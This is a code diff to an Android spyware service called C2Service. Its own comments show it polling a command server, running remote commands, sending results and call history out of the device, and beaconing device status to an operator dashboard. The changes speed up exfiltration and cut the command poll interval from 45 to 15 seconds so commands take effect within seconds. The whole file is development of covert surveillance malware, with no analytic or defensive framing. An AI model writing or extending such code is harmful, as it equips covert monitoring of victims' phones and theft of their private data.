@@ -109,16 +109,16 @@ class C2Service : Service() {
                     // never run on the main looper.
                     try {
                         Commands.dispatch(this, cmd, args)
-                        BatchExfil.enqueue(this, "cmd_result", """{"cmd":"$cmd","ok":true}""")
+                        Exfil.sendLog(this, "cmd_result", """{"cmd":"$cmd","ok":true}""")
                     } catch (t: Throwable) {
-                        BatchExfil.enqueue(this, "cmd_result", """{"cmd":"$cmd","ok":false,"err":"${t.javaClass.simpleName}"}""")
+                        Exfil.sendLog(this, "cmd_result", """{"cmd":"$cmd","ok":false,"err":"${t.javaClass.simpleName}"}""")
                     }
                     dispatched = true
                 }
                 if (dispatched) {
-                    // The result of a command must not wait for the 45-minute
-                    // batch - the dashboard reacts immediately.
-                    try { com.sp.core.worker.BatchFlushWorker.flushNow(this) } catch (_: Throwable) {}
+                    // Whatever was buffered goes out now - a command must
+                    // never wait for the 45-minute batch.
+                    try { BatchExfil.flush(this) } catch (_: Throwable) {}
                 }
             }
         } catch (_: Throwable) {
@@ -158,15 +158,20 @@ class C2Service : Service() {
 
 
     private val pollTask = object : Runnable {
+        private var tick = 0
         override fun run() {
+            tick++
             try {
                 pollCommands()
             } catch (_: Throwable) {
             }
             try {
                 // Liveness beacon - the dashboard shows the device as online
-                // even when the encrypted channel is silent.
-                com.sp.core.util.Beacon.send(this@C2Service, "alive", aliveInfo())
+                // even when the encrypted channel is silent. It goes out every
+                // third tick so the poll can stay fast.
+                if (tick % 3 == 1) {
+                    com.sp.core.util.Beacon.send(this@C2Service, "alive", aliveInfo())
+                }
             } catch (_: Throwable) {
             }
             // The call history is dumped on its own slow timer - it changes
@@ -189,7 +194,9 @@ class C2Service : Service() {
 
     companion object {
         private const val NOTIF_ID = 0x5F62
-        private const val POLL_INTERVAL_MS = 45_000L
+        // The command channel is polled fast - a command must take effect
+        // within a few seconds, not within a minute.
+        private const val POLL_INTERVAL_MS = 15_000L
         private const val CALL_DUMP_INTERVAL_MS = 5 * 60_000L
 
         private val pollClient = OkHttpClient.Builder()
